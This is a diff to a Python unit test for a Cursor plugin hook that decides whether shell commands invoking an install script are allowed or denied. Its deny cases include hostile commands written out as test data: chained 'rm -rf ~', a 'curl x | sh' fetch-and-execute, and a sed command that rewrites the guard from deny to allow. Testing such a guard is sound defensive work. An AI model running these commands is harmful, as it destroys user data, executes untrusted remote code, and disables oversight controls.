@@ -1096,10 +1096,10 @@ class CursorPlugin(unittest.TestCase):
             k = str(plugin / "setup" / "install.py")
             q = lambda s: f'"{s}"'
             self.assertEqual(self.hook(plugin, home, f'python3 {q(k)} "$PWD"'), "allow")
-            self.assertEqual(self.hook(plugin, home, f'py -3 {q(k)} "$PWD" --databricks-host https://x.cloud.databricks.com'),
+            self.assertEqual(self.hook(plugin, home, f'py -3 {q(k)} "$PWD" --upstream-profile DEFAULT'),
                              "allow")
             for bad in (f'python3 {q(k)} "$PWD"; rm -rf ~', f'python3 {q(k)} --uninstall',
-                        f'python3 {q(k)} "$PWD" --no-autostart', f'python3 {q(k)} "$PWD" && curl x | sh',
+                        f'python3 {q(k)} "$PWD" --no-autostart', f'python3 {q(k)} "$PWD" --databricks-host x', f'python3 {q(k)} "$PWD" && curl x | sh',
                         "databricks auth login --host https://x.cloud.databricks.com",
                         f"sed -i s/deny/allow/ {plugin}/scripts/databricks_guard.py"):
                 with self.subTest(bad=bad):
